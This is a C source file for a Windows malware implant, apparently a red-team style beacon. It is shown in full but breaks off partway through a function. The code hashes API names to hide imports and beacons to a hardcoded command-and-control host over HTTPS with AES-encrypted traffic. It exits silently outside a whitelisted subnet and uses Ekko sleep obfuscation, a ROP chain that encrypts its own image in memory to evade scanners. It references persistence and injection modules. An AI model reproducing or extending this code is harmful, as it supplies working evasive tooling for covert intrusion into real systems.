#include "winhttp.h"
#include "windows.h"
#include "bcrypt.h"
#include "ntdefs.h"
#include "config.h"
#include "anti_analysis.h"
#include "evasion.h"
#include "recon.h"
#include "postex.h"
#include "persist.h"
#include "injection.h"
#include "killswitch.h"
#include <winsock2.h>
#include <ws2tcpip.h>
#include <intrin.h>
#pragma comment(lib,"ws2_32.lib")
#pragma comment(lib, "bcrypt.lib")
#define KEYSIZE 32
#define IVSIZE 16
#define INITIAL_SEED 5
#define C_PTR(x) (PVOID) (x)
#define U_PTR(x) (UINT_PTR)(x)
//Precomputed hashes -run
#define WINHTTP_DLL_HASH 0xC1BEEBA7            // L"WINHTTP.DLL"
#define WinHttpOpen_HASH 0xB602FC4A            // "WinHttpOpen"
#define WinHttpConnect_HASH 0x29D5FBCD         // "WinHttpConnect"
#define WinHttpOpenRequest_HASH 0x08F1A3C9     // "WinHttpOpenRequest"
#define WinHttpSendRequest_HASH 0xD19AA3C7     // "WinHttpSendRequest"
#define WinHttpReceiveResponse_HASH 0xEF27FECD // "WinHttpReceiveResponse"
#define WinHttpReadData_HASH 0x488C0999        // "WinHttpReadData"
#define WinHttpCloseHandle_HASH 0x7A7F9586     // "WinHttpCloseHandle"
#define WinHttpQueryHeaders_HASH 0x18C58B22    // "WinHttpQueryHeaders"
// Use centralized config defines; fall back to defaults if not set
#ifndef CALLBACK_HOST
  #define CALLBACK_HOST L"www.the0dayworkshop.com"
#endif
#ifndef CALLBACK_PORT
  #define CALLBACK_PORT 443
#endif
#ifndef CALLBACK_ENDPOINT
  #define CALLBACK_ENDPOINT L"/check-in"
#endif
#ifndef CALLBACK_USERAGENT
  #define CALLBACK_USERAGENT L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
#endif
// Legacy aliases for existing code
#define C2_HOST       CALLBACK_HOST
#define C2_PORT       CALLBACK_PORT
#define C2_ENDPOINT   CALLBACK_ENDPOINT
#define C2_USERAGENT  CALLBACK_USERAGENT
#define READ_CHUNK_SIZE 4096
typedef enum _EVENT_TYPE {
    NotificationEvent,
    SynchronizationEvent
} EVENT_TYPE;
typedef struct _AES{
  PBYTE pKey;
  PBYTE pIv;
  PBYTE pPlainText;//used for the encryption and decryption for input
  DWORD dwPlainSize;
  PBYTE pCipherText;// output
  DWORD dwCipherSize;
} AES, *PEAS;

typedef struct _WIN32_API {
  NTSTATUS(NTAPI *RtlCreateTimerQueue)(_Out_ PHANDLE TimerQueueHandle);
  NTSTATUS(NTAPI *RtlCreateTimer)(_In_ HANDLE TimerQueueHandle,
                                  _Out_ PHANDLE Handle,
                                  _In_ WAITORTIMERCALLBACKFUNC Function,
                                  _In_opt_ PVOID Context, _In_ ULONG DueTime,
                                  _In_ ULONG Period, _In_ ULONG Flags);
  NTSTATUS(NTAPI *RtlDeleteTimerQueue)(_In_ HANDLE TimerQueueHandle);
  NTSTATUS(NTAPI *NtCreateEvent)(_Out_ PHANDLE EventHandle,
                                 _In_ ACCESS_MASK DesiredAccess,
                                 _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
                                 _In_ EVENT_TYPE EventType,
                                 _In_ BOOLEAN InitialState);
  NTSTATUS(NTAPI *NtWaitForSingleObject)(_In_ HANDLE Handle,
                                         _In_ BOOLEAN Alertable,
                                         _In_opt_ PLARGE_INTEGER Timeout);
  NTSTATUS(NTAPI *NtSignalAndWaitForSingleObject)(
      _In_ HANDLE SignalHandle, _In_ HANDLE WaitHandle, _In_ BOOLEAN Alertable,
      _In_opt_ PLARGE_INTEGER Timeout);
  PVOID SystemFunction032; // RC4 — used to XOR-encrypt image in memory
  PVOID NtContinue;        // resumes execution from a CONTEXT — drives ROP
} WIN32_API, *PWIN32_API;
// ── WinHTTP function pointer typedefs ───────────────────────────
// Required because we're resolving dynamically — no static imports
typedef HINTERNET(WINAPI *fnWinHttpOpen)(LPCWSTR pszAgentW, DWORD dwAccessType,
                                         LPCWSTR pszProxyW,
                                         LPCWSTR pszProxyBypassW,
                                         DWORD dwFlags);

typedef HINTERNET(WINAPI *fnWinHttpConnect)(HINTERNET hSession,
                                            LPCWSTR pswzServerName,
                                            INTERNET_PORT nServerPort,
                                            DWORD dwReserved);

typedef HINTERNET(WINAPI *fnWinHttpOpenRequest)(
    HINTERNET hConnect, LPCWSTR pwszVerb, LPCWSTR pwszObjectName,
    LPCWSTR pwszVersion, LPCWSTR pwszReferrer, LPCWSTR *ppwszAcceptTypes,
    DWORD dwFlags);

typedef BOOL(WINAPI *fnWinHttpSendRequest)(
    HINTERNET hRequest, LPCWSTR lpszHeaders, DWORD dwHeadersLength,
    LPVOID lpOptional, DWORD dwOptionalLength, DWORD dwTotalLength,
    DWORD_PTR dwContext);

typedef BOOL(WINAPI *fnWinHttpReceiveResponse)(HINTERNET hRequest,
                                               LPVOID lpReserved);

typedef BOOL(WINAPI *fnWinHttpReadData)(HINTERNET hRequest, LPVOID lpBuffer,
                                        DWORD dwNumberOfBytesToRead,
                                        LPDWORD lpdwNumberOfBytesRead);

typedef BOOL(WINAPI *fnWinHttpCloseHandle)(HINTERNET hInternet);

typedef BOOL(WINAPI *fnWinHttpQueryHeaders)(HINTERNET hRequest,
                                            DWORD dwInfoLevel, LPCWSTR pwszName,
                                            LPVOID lpBuffer,
                                            LPDWORD lpdwBufferLength,
                                            LPDWORD lpdwIndex);
VOID GenerateRandomBytes (PBYTE pBUffer, SIZE_T sSize)
{
for(int i =0;i<sSize;i++)
{
pBUffer[i]=(BYTE)rand() %0xFF;
}
}
// start checking call back to the reserve proxy
BOOL checking_connection(BOOL *Connection) {
  *Connection = FALSE;

  HINTERNET hSession = NULL;
  HINTERNET hConnect = NULL;
  HINTERNET hRequest = NULL;
  DWORD statusCode = 0;
  DWORD statusSize = sizeof(DWORD);

  // create session handle
  hSession = WinHttpOpen(C2_USERAGENT, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                         WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
  if (!hSession)
    goto cleanup;

  // connect to C2 reverse proxy
  hConnect = WinHttpConnect(hSession, C2_HOST, INTERNET_DEFAULT_HTTPS_PORT, 0);
  if (!hConnect)
    goto cleanup;

  // create GET request
  hRequest =
      WinHttpOpenRequest(hConnect, L"GET", NULL, NULL, WINHTTP_NO_REFERER,
                         WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
  if (!hRequest)
    goto cleanup;

  // send it
  if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                          WINHTTP_NO_REQUEST_DATA, 0, 0, 0))
    goto cleanup;

  // read response
  if (!WinHttpReceiveResponse(hRequest, NULL))
    goto cleanup;

  // check status code
  WinHttpQueryHeaders(hRequest,
                      WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                      WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &statusSize,
                      WINHTTP_NO_HEADER_INDEX);

  if (statusCode == 200)
    *Connection = TRUE;

cleanup:
  if (hRequest)
    WinHttpCloseHandle(hRequest);
  if (hConnect)
    WinHttpCloseHandle(hConnect);
  if (hSession)
    WinHttpCloseHandle(hSession);
  return *Connection;
}

// API HASHING
/*
1. Walk PEB → find kernel32/winhttp in loaded modules
2. Parse export table → hash each exported function name
3. Match hash → return function pointer
4. Replace all WinHttpXxx() calls with hashed lookups
*/
//Mod 50,51,53,54,55
// helper function that apply the bitwise rotation. 
static UINT32 _Rotr32(UINT32 Value, UINT Count)
{
    DWORD Mask = (CHAR_BIT * sizeof(Value)-1);
    Count&=Mask;
    #pragma warning(push)
    #pragma warning(disable: 4146)
        return(Value>>Count)|(Value<<((-Count)&Mask));
    #pragma warning(pop)
}
//hashing a ACSII string ( used for function) 
INT HashStringRotr32A(_In_ PCHAR String)
{
    INT Value =0;
    for (INT i =0; i<lstrlenA(String);i++)
    {
        Value = String[i] + _Rotr32(Value, INITIAL_SEED);
    }
    return Value;
}
//Used to Hash string ( used for module names e.g. L"WINHTTP.DLL)
INT HashStringRotr32W(_In_ PWCHAR String) {
  INT Value = 0;
  for (INT i = 0; i < lstrlenW(String); i++) {
    Value = String[i] + _Rotr32(Value, INITIAL_SEED);
  }
  return Value;
}
// ── PEB walk → find loaded module by hash ────────────────────────
HMODULE GetModuleHandleH(DWORD moduleHash) {
#ifdef _WIN64
  PPEB pPeb = (PPEB)__readgsqword(0x60);
#else
  PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif
  PPEB_LDR_DATA pLdr = pPeb->Ldr;
  PLIST_ENTRY pStart = &pLdr->InMemoryOrderModuleList;
  PLIST_ENTRY pEntry = pStart->Flink;

  while (pEntry != pStart) {
    PLDR_DATA_TABLE_ENTRY pMod =
        CONTAINING_RECORD(pEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);

    if (pMod->BaseDllName.Buffer != NULL) {
      if ((DWORD)HashStringRotr32W(pMod->BaseDllName.Buffer) == moduleHash)
        return (HMODULE)pMod->DllBase;
    }
    pEntry = pEntry->Flink;
  }
  return NULL;
}

// ── Export table walk → find function by hash ────────────────────
FARPROC GetProcAddressH(HMODULE hModule, DWORD funcHash) {
  if (!hModule)
    return NULL;

  PBYTE pBase = (PBYTE)hModule;

  PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBase;
  if (pDos->e_magic != IMAGE_DOS_SIGNATURE)
    return NULL;

  PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pBase + pDos->e_lfanew);
  if (pNt->Signature != IMAGE_NT_SIGNATURE)
    return NULL;

  DWORD expRva = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
                     .VirtualAddress;
  if (!expRva)
    return NULL;

  PIMAGE_EXPORT_DIRECTORY pExp = (PIMAGE_EXPORT_DIRECTORY)(pBase + expRva);

  PDWORD pNames = (PDWORD)(pBase + pExp->AddressOfNames);
  PWORD pOrdinals = (PWORD)(pBase + pExp->AddressOfNameOrdinals);
  PDWORD pFuncs = (PDWORD)(pBase + pExp->AddressOfFunctions);

  for (DWORD i = 0; i < pExp->NumberOfNames; i++) {
    PCHAR pName = (PCHAR)(pBase + pNames[i]);
    if ((DWORD)HashStringRotr32A(pName) == funcHash)
      return (FARPROC)(pBase + pFuncs[pOrdinals[i]]);
  }
  return NULL;
}

//ENcrypted the Payload
/*1. Derive AES key from a seed (hardcoded or negotiated)
2. Generate random 12-byte nonce per request
3. Encrypt your JSON/binary check-in body
4. Pack: [nonce 12B][tag 16B][ciphertext]
5. POST that blob — C2 decrypts on receive*/

//mod 19
static BYTE aes_key[KEYSIZE] = {0x3E, 0x31, 0xF4, 0x00, 0x50, 0xB6, 0x6E, 0xB8,
                           0xF6, 0x98, 0x95, 0x27, 0x43, 0x27, 0xC0, 0x55,
                           0xEB, 0xDB, 0xE1, 0x7F, 0x05, 0xFE, 0x65, 0x6D,
                           0x0F, 0xA6, 0x5B, 0x00, 0x33, 0xE6, 0xD9, 0x0B};
static BYTE aes_iv[IVSIZE] = {0xB4, 0xC8, 0x1D, 0x1D, 0x14, 0x7C, 0xCB, 0xFA,
                              0x07, 0x42, 0xD9, 0xED, 0x1A, 0x86, 0xD9, 0xCD};



BOOL InstallAesEncryption (PEAS pAes)
{
    BOOL bSTATE =TRUE;
    BCRYPT_ALG_HANDLE hAlgorithm = NULL;
    BCRYPT_KEY_HANDLE hKeyHandle = NULL;
    ULONG cbResult = NULL;
    DWORD dwBlockSize= NULL;
    DWORD cbKeyObject = NULL;
    PBYTE pbKeyObject = NULL;
    PBYTE pbCipherText = NULL;
    DWORD cbCipherText = NULL;
    NTSTATUS STATUS= NULL;
    //intializing "hAlgorith" as AES algorithm Handle
    STATUS = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM,NULL,0);
    if(!NT_SUCCESS(STATUS))
    {
        bSTATE = FALSE;
        goto _EndOfFunc;
    }

  // Getting the size of the key object variable pbKeyObject. This is used by the BCryptGenerateSymmetricKey function later 
  STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0);
  if (!NT_SUCCESS(STATUS)) {
    	printf("[!] BCryptGetProperty[1] Failed With Error: 0x%0.8X \n", STATUS);
    	bSTATE = FALSE; goto _EndOfFunc;
  }

  // Getting the size of the block used in the encryption. Since this is AES it must be 16 bytes.
  STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_BLOCK_LENGTH, (PBYTE)&dwBlockSize, sizeof(DWORD), &cbResult, 0);
  if (!NT_SUCCESS(STATUS)) {
   	printf("[!] BCryptGetProperty[2] Failed With Error: 0x%0.8X \n", STATUS);
    	bSTATE = FALSE; goto _EndOfFunc;
  }

  // Checking if block size is 16 bytes
  if (dwBlockSize != 16) {
    	bSTATE = FALSE; goto _EndOfFunc;
  }

  // Allocating memory for the key object 
  pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
  if (pbKeyObject == NULL) {
    	bSTATE = FALSE; goto _EndOfFunc;
  }

  // Setting Block Cipher Mode to CBC. This uses a 32 byte key and a 16 byte IV.
  STATUS = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
  if (!NT_SUCCESS(STATUS)) {
    	printf("[!] BCryptSetProperty Failed With Error: 0x%0.8X \n", STATUS);
    	bSTATE = FALSE; goto _EndOfFunc;
  }

  // Generating the key object from the AES key "pAes->pKey". The output will be saved in pbKeyObject and will be of size cbKeyObject 
  STATUS = BCryptGenerateSymmetricKey(hAlgorithm, &hKeyHandle, pbKeyObject, cbKeyObject, (PBYTE)pAes->pKey, KEYSIZE, 0);
  if (!NT_SUCCESS(STATUS)) {
    	printf("[!] BCryptGenerateSymmetricKey Failed With Error: 0x%0.8X \n", STATUS);
    	bSTATE = FALSE; goto _EndOfFunc;
  }

  // Running BCryptEncrypt first time with NULL output parameters to retrieve the size of the output buffer which is saved in cbCipherText
  STATUS = BCryptEncrypt(hKeyHandle, (PUCHAR)pAes->pPlainText, (ULONG)pAes->dwPlainSize, NULL, pAes->pIv, IVSIZE, NULL, 0, &cbCipherText, BCRYPT_BLOCK_PADDING);
  if (!NT_SUCCESS(STATUS)) {
    	printf("[!] BCryptEncrypt[1] Failed With Error: 0x%0.8X \n", STATUS);
    	bSTATE = FALSE; goto _EndOfFunc;
  }

  // Allocating enough memory for the output buffer, cbCipherText
  pbCipherText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbCipherText);
  if (pbCipherText == NULL) {
    	bSTATE = FALSE; goto _EndOfFunc;
  }

  // Running BCryptEncrypt again with pbCipherText as the output buffer
  STATUS = BCryptEncrypt(hKeyHandle, (PUCHAR)pAes->pPlainText, (ULONG)pAes->dwPlainSize, NULL, pAes->pIv, IVSIZE, pbCipherText, cbCipherText, &cbResult, BCRYPT_BLOCK_PADDING);
  if (!NT_SUCCESS(STATUS)) {
    	printf("[!] BCryptEncrypt[2] Failed With Error: 0x%0.8X \n", STATUS);
    	bSTATE = FALSE; goto _EndOfFunc;
  }


  // Clean up
_EndOfFunc:
  if (hKeyHandle) 
    	BCryptDestroyKey(hKeyHandle);
  if (hAlgorithm) 
    	BCryptCloseAlgorithmProvider(hAlgorithm, 0);
  if (pbKeyObject) 
    	HeapFree(GetProcessHeap(), 0, pbKeyObject);
  if (pbCipherText != NULL && bSTATE) {
        // If everything worked, save pbCipherText and cbCipherText 
        pAes->pCipherText 	= pbCipherText;
        pAes->dwCipherSize 	= cbCipherText;
  }
  return bSTATE;
}
VOID comms_wipe_keys(VOID) {
  SecureZeroMemory(aes_key, KEYSIZE);
  SecureZeroMemory(aes_iv, IVSIZE);
}

BOOL InstallAesDecryption (PEAS pAes)
{
  BOOL bSTATE = TRUE;
  BCRYPT_ALG_HANDLE hAlgorithm = NULL;
  BCRYPT_KEY_HANDLE hKeyHandle = NULL;

  ULONG cbResult = NULL;
  DWORD dwBlockSize = NULL;

  DWORD cbKeyObject = NULL;
  PBYTE pbKeyObject = NULL;

  PBYTE pbPlainText = NULL;
  DWORD cbPlainText = NULL;
  NTSTATUS STATUS = NULL;

  // Intializing "hAlgorithm" as AES algorithm Handle
  STATUS =
      BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
  if (!NT_SUCCESS(STATUS)) {
    printf("[!] BCryptOpenAlgorithmProvider Failed With Error: 0x%0.8X \n",
           STATUS);
    bSTATE = FALSE;
    goto _EndOfFunc;
  }

  // Getting the size of the key object variable pbKeyObject. This is used by
  // the BCryptGenerateSymmetricKey function later
  STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_OBJECT_LENGTH,
                             (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0);
  if (!NT_SUCCESS(STATUS)) {
    printf("[!] BCryptGetProperty[1] Failed With Error: 0x%0.8X \n", STATUS);
    bSTATE = FALSE;
    goto _EndOfFunc;
  }

  // Getting the size of the block used in the encryption. Since this is AES it
  // should be 16 bytes.
  STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_BLOCK_LENGTH,
                             (PBYTE)&dwBlockSize, sizeof(DWORD), &cbResult, 0);
  if (!NT_SUCCESS(STATUS)) {
    printf("[!] BCryptGetProperty[2] Failed With Error: 0x%0.8X \n", STATUS);
    bSTATE = FALSE;
    goto _EndOfFunc;
  }

  // Checking if block size is 16 bytes
  if (dwBlockSize != 16) {
    bSTATE = FALSE;
    goto _EndOfFunc;
  }

  // Allocating memory for the key object
  pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
  if (pbKeyObject == NULL) {
    bSTATE = FALSE;
    goto _EndOfFunc;
  }

  // Setting Block Cipher Mode to CBC. This uses a 32 byte key and a 16 byte IV.
  STATUS = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE,
                             (PBYTE)BCRYPT_CHAIN_MODE_CBC,
                             sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
  if (!NT_SUCCESS(STATUS)) {
    printf("[!] BCryptSetProperty Failed With Error: 0x%0.8X \n", STATUS);
    bSTATE = FALSE;
    goto _EndOfFunc;
  }

  // Generating the key object from the AES key "pAes->pKey". The output will be
  // saved in pbKeyObject of size cbKeyObject
  STATUS =
      BCryptGenerateSymmetricKey(hAlgorithm, &hKeyHandle, pbKeyObject,
                                 cbKeyObject, (PBYTE)pAes->pKey, KEYSIZE, 0);
  if (!NT_SUCCESS(STATUS)) {
    printf("[!] BCryptGenerateSymmetricKey Failed With Error: 0x%0.8X \n",
           STATUS);
    bSTATE = FALSE;
    goto _EndOfFunc;
  }

  // Running BCryptDecrypt first time with NULL output parameters to retrieve
  // the size of the output buffer which is saved in cbPlainText
  STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pAes->pCipherText,
                         (ULONG)pAes->dwCipherSize, NULL, pAes->pIv, IVSIZE,
                         NULL, 0, &cbPlainText, BCRYPT_BLOCK_PADDING);
  if (!NT_SUCCESS(STATUS)) {
    printf("[!] BCryptDecrypt[1] Failed With Error: 0x%0.8X \n", STATUS);
    bSTATE = FALSE;
    goto _EndOfFunc;
  }

  // Allocating enough memory for the output buffer, cbPlainText
  pbPlainText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbPlainText);
  if (pbPlainText == NULL) {
    bSTATE = FALSE;
    goto _EndOfFunc;
  }

  // Running BCryptDecrypt again with pbPlainText as the output buffer
  STATUS =
      BCryptDecrypt(hKeyHandle, (PUCHAR)pAes->pCipherText,
                    (ULONG)pAes->dwCipherSize, NULL, pAes->pIv, IVSIZE,
                    pbPlainText, cbPlainText, &cbResult, BCRYPT_BLOCK_PADDING);
  if (!NT_SUCCESS(STATUS)) {
    printf("[!] BCryptDecrypt[2] Failed With Error: 0x%0.8X \n", STATUS);
    bSTATE = FALSE;
    goto _EndOfFunc;
  }

  // Clean up
_EndOfFunc:
  if (hKeyHandle)
    BCryptDestroyKey(hKeyHandle);
  if (hAlgorithm)
    BCryptCloseAlgorithmProvider(hAlgorithm, 0);
  if (pbKeyObject)
    HeapFree(GetProcessHeap(), 0, pbKeyObject);
  if (pbPlainText != NULL && bSTATE) {
    // if everything went well, we save pbPlainText and cbPlainText
    pAes->pPlainText = pbPlainText;
    pAes->dwPlainSize = cbPlainText;
  }
  return bSTATE;
}
BOOL SimpleEncryption(
    PVOID pPlaintext,
    DWORD dwPlainSize,
    PBYTE pKey,
    PBYTE pIv,
    PVOID* pCipherText,
    DWORD* dwCipherSize
){
    AES aes = {0};
    aes.pKey = pKey;
    aes.pIv = pIv;
    aes.pPlainText = (PBYTE)pPlaintext;
    aes.dwPlainSize = dwPlainSize;
    if (!InstallAesEncryption(&aes)) return FALSE;
    *pCipherText = aes.pCipherText;
    *dwCipherSize = aes.dwCipherSize;
    return TRUE;
}
BOOL SimpleDecryption(PVOID pCipherText, DWORD dwCipherSize, PBYTE pKey,
                      PBYTE pIv, PVOID *pPlainText, DWORD* dwPlainSize) {
    AES aes = {0};
    aes.pKey = pKey;
    aes.pIv = pIv;
    aes.pCipherText = (PBYTE)pCipherText;
    aes.dwCipherSize = dwCipherSize;
    if (!InstallAesDecryption(&aes)) return FALSE;
    *pPlainText = aes.pPlainText;
    *dwPlainSize = aes.dwPlainSize;
    return TRUE;
}

BOOL aes_encrypt_payload(
    PBYTE plain, DWORD plainLen, PVOID* outCipher, DWORD* outLen
) {
    if (!SimpleEncryption(plain, plainLen, aes_key, aes_iv, outCipher,
                          outLen))
        return FALSE;
    return TRUE;
}

BOOL aes_decrypt_payload(
    PBYTE cipher, DWORD cipherLen, PVOID* outPlain, DWORD* outLen
) {
    if (!SimpleDecryption(cipher, cipherLen, aes_key, aes_iv, outPlain,
                          outLen))
        return FALSE;
    return TRUE;
}

//IP WhiteList Gate
/*
1. Call GetAdaptersInfo() → enumerate NICs
2. Check IP against expected subnet (e.g. 10.10.30.0/24)
3. If not in range → ExitProcess(0) silently
4. If in range → continue to beacon loop
*/
 ULONG GetCurrentIpAddress(){
    INTERFACE_INFO Interfaces[10] = {0};
    WSADATA Data = {0};
    SOCKET Socket = {0};
   ULONG AddressIp =0;
   ULONG Length =0;

   RtlSecureZeroMemory(&Interfaces, sizeof(Interfaces));

   if (WSAStartup(MAKEWORD(2, 2), &Data) != 0)
     goto END;
   if ((Socket = WSASocketW(AF_INET, SOCK_DGRAM, 0, 0, 0, 0)) == INVALID_SOCKET)
     goto END;
   if (WSAIoctl(Socket, SIO_GET_INTERFACE_LIST, 0, 0, &Interfaces,
                sizeof(Interfaces), &Length, 0, 0) != 0)
     goto END;

   for (int i = 0; i < ARRAYSIZE(Interfaces); i++) {
     if ((Interfaces[i].iiFlags & IFF_UP) &&
         !(Interfaces[i].iiFlags & IFF_LOOPBACK)) {
       AddressIp = Interfaces[i].iiAddress.AddressIn.sin_addr.S_un.S_addr;
       break;
     }
   }
END:
  WSACleanup();
  return AddressIp;
}

BOOL ip_whitelist_gate(){
    //change these values
    ULONG start = inet_addr("10.10.30.1");
    ULONG end = inet_addr("10.10.30.254");
    ULONG ip = GetCurrentIpAddress();

    if (ip >= start && ip <= end)
      return TRUE;

    ExitProcess(0); // silent exit — don't return FALSE, just die
    return FALSE;   // unreachable, satisfies compiler
}

//Ekko Sleep
/*
1. Before sleeping → encrypt beacon .text section in memory
2. Queue APC timer for sleep duration
3. Beacon image is encrypted garbage during sleep
4. On wake → decrypt .text section
5. Resume beacon loop
*/
//mod 144,145
BOOL InitializeWinApi32(OUT PWIN32_API pWin32Apis) {
    HMODULE hNtdll = NULL;
    HMODULE hAdvapi32 = NULL;

    hNtdll = GetModuleHandleA("ntdll");
    if (!hNtdll) {
      printf("[!] GetModuleHandleA(ntdll) Failed: %ld\n", GetLastError());
      return FALSE;
    }

    hAdvapi32 = LoadLibraryA("Advapi32");
    if (!hAdvapi32) {
      printf("[!] LoadLibraryA(Advapi32) Failed: %ld\n", GetLastError());
      return FALSE;
    }

    pWin32Apis->RtlCreateTimerQueue =
        GetProcAddress(hNtdll, "RtlCreateTimerQueue");
    pWin32Apis->RtlCreateTimer = GetProcAddress(hNtdll, "RtlCreateTimer");
    pWin32Apis->RtlDeleteTimerQueue =
        GetProcAddress(hNtdll, "RtlDeleteTimerQueue");
    pWin32Apis->NtCreateEvent = GetProcAddress(hNtdll, "NtCreateEvent");
    pWin32Apis->NtWaitForSingleObject =
        GetProcAddress(hNtdll, "NtWaitForSingleObject");
    pWin32Apis->NtSignalAndWaitForSingleObject =
        GetProcAddress(hNtdll, "NtSignalAndWaitForSingleObject");
    pWin32Apis->NtContinue = GetProcAddress(hNtdll, "NtContinue");
    pWin32Apis->SystemFunction032 =
        GetProcAddress(hAdvapi32, "SystemFunction032");

    // verify nothing came back NULL
    if (!pWin32Apis->RtlCreateTimerQueue || !pWin32Apis->RtlCreateTimer ||
        !pWin32Apis->NtCreateEvent || !pWin32Apis->NtContinue ||
        !pWin32Apis->SystemFunction032) {
      printf("[!] One or more function pointers failed to resolve\n");
      return FALSE;
    }

    printf("[+] Win32 API pointers resolved\n");
    return TRUE;
}

// ── Random 32-bit value via hardware RNG ─────────────────────────
static ULONG Random32() {
    UINT32 Seed = 0;
    _rdrand32_step(&Seed);
    return Seed;
}

// ── Ekko sleep obfuscation ───────────────────────────────────────
// What this does:
//   1. Captures current thread CONTEXT via RtlCaptureContext
//   2. Queues a ROP chain through timer callbacks using NtContinue
//   3. Chain: WaitForSingleObjectEx → VirtualProtect(RW) →
//             SystemFunction032(encrypt) → WaitForSingleObjectEx(sleep) →
//             SystemFunction032(decrypt) → VirtualProtect(RX) → SetEvent
//   4. While sleeping, beacon .text is encrypted garbage in memory
//   5. On wake, image is restored and execution continues normally
VOID EkkoObf(IN PWIN32_API pWin32Apis, IN DWORD dwTimeOut) {
    NTSTATUS Status = STATUS_SUCCESS;
    STRING Key = {0};
    STRING Img = {0};
    BYTE Rnd[16] = {0};
    CONTEXT Ctx[7] = {0};
    CONTEXT CtxInit = {0};
    HANDLE EvntTimer = NULL;
    HANDLE EvntStart = NULL;
    HANDLE EvntEnd = NULL;
    HANDLE Queue = NULL;
    HANDLE Timer = NULL;
    DWORD Delay = 0;
    DWORD Value = 0;

    // get beacon image base + size from PE headers
    PVOID ImageBase = GetModuleHandleA(NULL);
    ULONG ImageSize =
        ((PIMAGE_NT_HEADERS)(U_PTR(ImageBase) +
                             ((PIMAGE_DOS_HEADER)ImageBase)->e_lfanew))
            ->OptionalHeader.SizeOfImage;

    printf("[*] Ekko: Image @ %p [%ld bytes] | Sleep: %ld ms\n", ImageBase,
           ImageSize, dwTimeOut);

    // generate random 16-byte RC4 key for this sleep cycle
    for (int i = 0; i < 16; i++)
      Rnd[i] = (BYTE)Random32();

    // set up STRING structs for SystemFunction032 (RC4)
    Key.Buffer = (PCHAR)Rnd;
    Key.Length = sizeof(Rnd);
    Img.Buffer = (PCHAR)ImageBase;
    Img.Length = (USHORT)ImageSize;

    // create timer queue
    if (!NT_SUCCESS(Status = pWin32Apis->RtlCreateTimerQueue(&Queue))) {
      printf("[!] RtlCreateTimerQueue Failed: %lx\n", Status);
      goto LEAVE;
    }

    // create 3 events:
    //   EvntTimer — signals when RtlCaptureContext has run
    //   EvntStart — signals the ROP chain to begin
    //   EvntEnd   — signals that the ROP chain finished
    if (!NT_SUCCESS(Status = pWin32Apis->NtCreateEvent(
                        &EvntTimer, EVENT_ALL_ACCESS, NULL, NotificationEvent,
                        FALSE)) ||
        !NT_SUCCESS(Status = pWin32Apis->NtCreateEvent(
                        &EvntStart, EVENT_ALL_ACCESS, NULL, NotificationEvent,
                        FALSE)) ||
        !NT_SUCCESS(
            Status = pWin32Apis->NtCreateEvent(&EvntEnd, EVENT_ALL_ACCESS, NULL,
                                               NotificationEvent, FALSE))) {
      printf("[!] NtCreateEvent Failed: %lx\n", Status);
      goto LEAVE;
    }

    // capture the current thread context — this is the base CONTEXT
    // all 7 ROP frames are cloned from this, each with modified
    // Rip/Rcx/Rdx/R8/R9 to fake a different function call
    if (!NT_SUCCESS(Status = pWin32Apis->RtlCreateTimer(
                        Queue, &Timer, RtlCaptureContext, &CtxInit,
                        Delay += 100, 0, WT_EXECUTEINTIMERTHREAD)) ||
        !NT_SUCCESS(Status = pWin32Apis->RtlCreateTimer(
                        Queue, &Timer, (WAITORTIMERCALLBACKFUNC)SetEvent,
                        EvntTimer, Delay += 100, 0, WT_EXECUTEINTIMERTHREAD))) {
      printf("[!] RtlCreateTimer [capture] Failed: %lx\n", Status);
      goto LEAVE;
    }

    // wait until RtlCaptureContext has populated CtxInit
    if (!NT_SUCCESS(Status = pWin32Apis->NtWaitForSingleObject(EvntTimer, FALSE,
                                                               NULL))) {
      printf("[!] NtWaitForSingleObject [capture] Failed: %lx\n", Status);
      goto LEAVE;
    }

    // clone CtxInit into all 7 frames and adjust RSP
    // (subtract pointer size so NtContinue's ret lands in the right place)
    for (int i = 0; i < 7; i++) {
      memcpy(&Ctx[i], &CtxInit, sizeof(CONTEXT));
      Ctx[i].Rsp -= sizeof(PVOID);
    }

    // ── ROP chain: 7 frames ──────────────────────────────────────
    // [0] Wait on EvntStart — holds here until we signal it below
    Ctx[0].Rip = U_PTR(WaitForSingleObjectEx);
    Ctx[0].Rcx = U_PTR(EvntStart);
    Ctx[0].Rdx = U_PTR(INFINITE);
    Ctx[0].R8 = U_PTR(FALSE);

    // [1] VirtualProtect → RW  (must be writable before encrypt)
    Ctx[1].Rip = U_PTR(VirtualProtect);
    Ctx[1].Rcx = U_PTR(ImageBase);
